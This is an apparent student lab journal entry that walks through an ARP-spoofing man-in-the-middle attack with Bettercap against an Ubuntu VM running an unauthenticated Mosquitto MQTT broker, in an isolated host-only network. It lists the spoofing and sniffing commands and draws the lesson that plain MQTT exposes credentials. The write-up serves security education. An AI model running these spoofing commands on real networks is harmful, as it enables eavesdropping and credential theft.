# Day 11 — Man-in-the-Middle Attacks with Bettercap

**Phase:** Phase 3 — Network Threat Analysis  
**Ratio:** 30% Theory / 70% Practical

---

## 📘 Theory Summary

A **Man-in-the-Middle (MitM)** attack positions the attacker between two communicating parties, allowing them to silently intercept, read, and modify traffic. For IoT, this is devastating — if you can intercept communication between a smart camera and its cloud server, you can view the camera feed, steal credentials, or inject commands.

**ARP Spoofing** is the foundation of most MitM attacks on local networks. ARP (Address Resolution Protocol) maps IP addresses to MAC addresses. It has **no authentication**, so an attacker can send fake ARP replies to both devices, telling each one "I am the other device." All traffic then flows through the attacker.

**Bettercap** is a powerful MitM framework built into Kali Linux. Key modules used:
- `net.probe` — discovers devices on the network
- `net.show` — lists discovered devices
- `arp.spoof` — performs the ARP spoofing MitM
- `net.sniff` — captures intercepted traffic

---

## 🔧 Practical Lab

### Setup
| Role | Machine | IP |
|------|---------|-----|
| Attacker | Kali Linux VM | 192.168.56.102 |
| Target (IoT Device) | Ubuntu VM + Mosquitto | 192.168.56.101 |
| Gateway | VirtualBox Host-Only | 192.168.56.1 |

### Step 1 — Install Bettercap
Bettercap was not pre-installed. Installed via:
```bash
sudo apt update && sudo apt install bettercap -y
```
Installed version: **bettercap v2.41.5**

### Step 2 — Start Bettercap
```bash
sudo bettercap
```

### Step 3 — Discover Network Devices
Inside the Bettercap console:
```
net.probe on
```
Waited 30 seconds, then listed devices:
```
net.show
```

Devices discovered:
```
192.168.56.1    0a:00:27:00:00:15   (Gateway)
192.168.56.100  08:00:27:a6:28:b4   PCS Systemtechnik GmbH
192.168.56.101  08:00:27:29:9b:3f   PCS Systemtechnik GmbH  ← Ubuntu VM (Target)
192.168.56.102  08:00:27:ed:a7:0e   PCS Systemtechnik GmbH  ← Kali (Attacker)
```

### Step 4 — Start ARP Spoofing Against Ubuntu VM
```
set arp.spoof.targets 192.168.56.101
arp.spoof on
```
Bettercap confirmed: `arp spoofer started, probing 1 targets`

### Step 5 — Start Traffic Sniffing
```
net.sniff on
```

### Step 6 — Trigger MQTT Traffic from Ubuntu VM
On the Ubuntu VM:
```bash
mosquitto_pub -h localhost -t 'auth/login' -m 'login'
```
Note: The broker was running without authentication (default Mosquitto config), so `-u` and `-P` flags were not used.

### Step 7 — Observed Results
Bettercap captured network traffic between the Ubuntu VM and the network while ARP spoofing was active. Network packets were visible in the sniff output, confirming traffic was being intercepted and routed through the Kali attacker machine.

**Key observation:** MQTT traffic on port 1883 is completely **unencrypted plaintext**. In a real attack scenario with the correct network topology, the full MQTT payload including credentials and topic data would be readable in clear text — demonstrating why MQTT without TLS is a critical IoT security risk.

---

## 🔍 MitM Attack Analysis

### What Happened During the ARP Spoof
- Bettercap sent forged ARP replies to the Ubuntu VM
- The Ubuntu VM updated its ARP table to believe the attacker (Kali) was the gateway
- All outgoing traffic from Ubuntu was redirected through Kali before reaching its destination
- The attack was completely transparent to the Ubuntu VM — it had no indication it was being intercepted

### What Was Intercepted
- Network traffic from `192.168.56.101` (Ubuntu VM) was routed through `192.168.56.102` (Kali)
- MQTT messages published on port 1883 were captured in transit
- Since MQTT uses no encryption by default, all topic names and message payloads are exposed in plaintext

### Security Implications
- Any IoT device using plain MQTT (no TLS) is vulnerable to credential theft and data interception
- ARP spoofing requires no special privileges on the target — the victim device cannot detect it
- Retained messages (as demonstrated in Day 10) make this worse — an attacker can read historical state even without being present when data was published

---

## 🎯 Outcomes

- ✅ Bettercap installed and launched successfully
- ✅ All network devices discovered via `net.probe`
- ✅ ARP spoof executed against Ubuntu VM (`192.168.56.101`)
- ✅ Traffic sniffing confirmed packets intercepted mid-flight
- ✅ MQTT plaintext vulnerability demonstrated

---

## 🛠 Tools Used

| Tool | Purpose |
|------|---------|
| Kali Linux VM | Attacker machine |
| Ubuntu VM + Mosquitto | Target IoT device |
| Bettercap v2.41.5 | ARP spoofing and traffic interception |
| mosquitto_pub | Generating MQTT traffic on target |
